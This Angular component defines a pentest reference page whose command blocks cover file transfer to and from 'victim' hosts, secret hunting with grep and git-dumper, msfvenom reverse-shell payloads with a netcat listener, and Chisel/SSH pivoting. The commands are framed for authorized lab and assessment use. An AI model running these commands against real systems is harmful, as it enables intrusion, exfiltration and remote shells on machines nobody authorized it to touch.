import { Component, DestroyRef, OnInit, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { MatExpansionModule } from '@angular/material/expansion';
import { ActivatedRoute, Router, RouterLink } from '@angular/router';
import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
import { Terminal } from '../../shared/terminal/terminal';
import { SectionIndexComponent, SectionIndexItem } from '../../shared/components/section-index/section-index';

interface ReferenceCommandBlock {
  context: string;
  command: string;
}

interface ReferenceLink {
  label: string;
  route: string;
  queryParams?: Record<string, string>;
}

interface ReferenceSection {
  title: string;
  description: string;
  blocks: ReferenceCommandBlock[];
  links?: ReferenceLink[];
}

@Component({
  selector: 'app-useful-stuff',
  standalone: true,
  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent, RouterLink],
  templateUrl: './useful-stuff.html',
  styleUrl: './useful-stuff.scss'
})
export class UsefulStuffComponent implements OnInit {
  selectedSection = 'file-transfer';

  readonly sections: SectionIndexItem[] = [
    { id: 'file-transfer', label: 'File Transfer', group: 'Transfers', important: true },
    { id: 'git-files', label: 'Git & File Hunting', group: 'Recon' },
    { id: 'database-reference', label: 'Database References', group: 'Services' },
    { id: 'tunneling', label: 'Tunneling & Port Forwarding', group: 'Networking', important: true },
    { id: 'payload-formats', label: 'Payload Formats', group: 'Tooling' },
    { id: 'python-environments', label: 'Python Environments', group: 'Tooling' },
    { id: 'rdp', label: 'RDP Toolkit', group: 'Remote Access' }
  ];

  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);
  private readonly destroyRef = inject(DestroyRef);

  ngOnInit(): void {
    this.route.queryParamMap
      .pipe(takeUntilDestroyed(this.destroyRef))
      .subscribe(params => {
        const section = params.get('section');
        if (section && this.sections.some(item => item.id === section)) {
          this.selectedSection = section;
        }
      });
  }

  selectSection(section: string): void {
    this.selectedSection = section;
    void this.router.navigate([], {
      relativeTo: this.route,
      queryParams: { section },
      replaceUrl: true
    });
  }

  get currentSection(): ReferenceSection {
    return this.referenceSections[this.selectedSection] ?? this.referenceSections['file-transfer'];
  }

  readonly referenceSections: Record<string, ReferenceSection> = {
    'file-transfer': {
      title: 'File Transfer',
      description: 'Move files between Kali and Windows/Linux in either direction.',
      blocks: [
        { context: 'HTTP · on Kali', command: 'python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0' },
        {
          context: 'HTTP · on Windows',
          command: `certutil -urlcache -split -f http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.exe file.exe
iwr http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.exe -OutFile file.exe
curl.exe -f http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.exe -o file.exe`
        },
        { context: 'SMB · on Kali: serve the current directory', command: 'impacket-smbserver share . -smb2support -username kali -password kali' },
        {
          context: 'SMB · on Windows: upload or download',
          command: String.raw`net use \\{{LOCAL_IP}}\share /user:kali kali
copy file.exe \\{{LOCAL_IP}}\share\file.exe
copy \\{{LOCAL_IP}}\share\file.exe file.exe`
        },
        { context: 'Netcat · on Kali: receive from a Linux/Windows host', command: 'nc -lvnp {{LOCAL_PORT}} > file.bin' },
        { context: 'Netcat · on Linux victim: send a file to Kali', command: 'nc {{LOCAL_IP}} {{LOCAL_PORT}} < file.bin' },
        {
          context: 'HTTP · on Linux victim: download from Kali',
          command: `wget http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.sh -O file.sh
curl -f http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.sh -o file.sh`
        },
        { context: 'SCP · Kali to Linux target', command: 'scp file <USER>@{{TARGET_IP}}:/tmp/' },
        { context: 'SCP · Linux target to Kali', command: 'scp <USER>@{{TARGET_IP}}:/tmp/file .' },
        {
          context: 'Base64 · encode on source, paste chunks on destination, then decode',
          command: `base64 file.bin
echo 'BASE64_CONTENT' >> file.b64
base64 -d file.b64 > file.bin`
        },
        { context: 'FTP · on Kali: temporary server for an isolated lab', command: 'sudo python3 -m pyftpdlib -p {{LOCAL_PORT}}' },
        { context: 'FTP · on target: connect, then use get/put in the prompt', command: 'ftp {{LOCAL_IP}} {{LOCAL_PORT}}' },
        {
          context: 'Integrity · compare hashes on source and destination',
          command: `sha256sum file.bin
Get-FileHash file.bin -Algorithm SHA256`
        }
      ]
    },
    'git-files': {
      title: 'Git & File Hunting',
      description: 'Check exposed repository metadata and search scoped directories for configuration or secret material.',
      blocks: [
        { context: 'Check for exposed Git metadata', command: `curl -i http://{{TARGET_IP}}/.git/HEAD
curl -i http://{{TARGET_IP}}/.git/config` },
        { context: 'Recover an exposed repository and inspect its history', command: `git-dumper http://{{TARGET_IP}}/.git/ ./repo-output
cd repo-output
git log --oneline --all
git log -p --all` },
        { context: 'Search a recovered repository for likely secrets', command: `grep -RInE 'password|passwd|token|secret|api[_-]?key|private[_-]?key' .
git log --all -S'password' --oneline` },
        { context: 'Linux · search common application directories', command: String.raw`find /home /var/www /opt -type f \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \) 2>/dev/null
grep -RInE 'password|token|secret|api[_-]?key' /var/www /opt 2>/dev/null` },
        { context: 'Windows PowerShell · search selected directories', command: 'Get-ChildItem C:\\Users,C:\\ProgramData,C:\\inetpub -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match \'pass|cred|config|backup|unattend\' }' }
      ]
    },
    'database-reference': {
      title: 'Database References',
      description: 'Use the service guide for database access and the web guide for SQL injection instead of duplicating their command sets.',
      blocks: [],
      links: [
        { label: 'MySQL / MSSQL / PostgreSQL service enumeration', route: '/common-services', queryParams: { service: 'databases' } },
        { label: 'SQL Injection and database-specific testing', route: '/web', queryParams: { section: 'sqli' } }
      ]
    },
    tunneling: {
      title: 'Tunneling & Port Forwarding',
      description: 'Use a tunnel only after identifying a reachable internal service and confirming the route is in scope.',
      blocks: [
        { context: 'SSH · expose a remote localhost service on Kali', command: 'ssh -N -L {{LOCAL_PORT}}:127.0.0.1:{{TARGET_PORT}} <USER>@{{TARGET_IP}}' },
        { context: 'SSH · create a SOCKS proxy through an authorized pivot', command: 'ssh -N -D {{LOCAL_PORT}} <USER>@{{TARGET_IP}}' },
        { context: 'Chisel · start the reverse-capable server on Kali', command: 'chisel server --reverse --port {{LOCAL_PORT}}' },
        { context: 'Chisel · forward a target-side localhost service to Kali', command: 'chisel client {{LOCAL_IP}}:{{LOCAL_PORT}} R:{{TARGET_PORT}}:127.0.0.1:{{TARGET_PORT}}' }
      ],
      links: [
        { label: 'Ligolo-ng pivot workflow in Active Directory', route: '/ad', queryParams: { service: 'ad-flow' } }
      ]
    },
    'payload-formats': {
      title: 'Payload Formats',
      description: 'Choose a format that matches the authorized target OS and delivery path.',
      blocks: [
        { context: 'Windows x64 executable', command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LOCAL_IP}} LPORT={{LOCAL_PORT}} -f exe -o payload.exe' },
        { context: 'Linux x64 executable', command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LOCAL_IP}} LPORT={{LOCAL_PORT}} -f elf -o payload.elf' },
        { context: 'PHP payload for an authorized web lab', command: 'msfvenom -p php/reverse_php LHOST={{LOCAL_IP}} LPORT={{LOCAL_PORT}} -f raw -o payload.php' },
        { context: 'Listener on Kali', command: 'nc -lvnp {{LOCAL_PORT}}' }
      ]
    },
    'python-environments': {
      title: 'Python Environments',
      description: 'Keep assessment-tool dependencies isolated from Kali system Python (PEP 668).',
      blocks: [
        { context: 'Kali/Linux · create and activate a virtual environment', command: `python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip` },
        { context: 'Install dependencies in the active environment', command: `python -m pip install -r requirements.txt
python -m pip install impacket` },
        { context: 'Windows PowerShell · activate a virtual environment', command: '.\\.venv\\Scripts\\Activate.ps1' },
        { context: 'Leave the active virtual environment', command: 'deactivate' }
      ]
    },
    rdp: {
      title: 'RDP Toolkit',
      description: 'Connect with authorized credentials. Avoid putting reusable passwords directly in shell history.',
      blocks: [
        { context: 'Basic connection · FreeRDP prompts for the password', command: 'xfreerdp /v:{{TARGET_IP}} /u:<USER> /cert:ignore' },
        { context: 'Domain account format', command: 'xfreerdp /v:{{TARGET_IP}} /u:<DOMAIN>\\<USER> /cert:ignore' },
        { context: 'Clipboard and dynamic resolution', command: 'xfreerdp /v:{{TARGET_IP}} /u:<USER> /cert:ignore +clipboard /dynamic-resolution' },
        { context: 'Troubleshoot RDP security negotiation only when required', command: 'xfreerdp /v:{{TARGET_IP}} /u:<USER> /cert:ignore /sec:rdp' }
      ]
    }
  };
}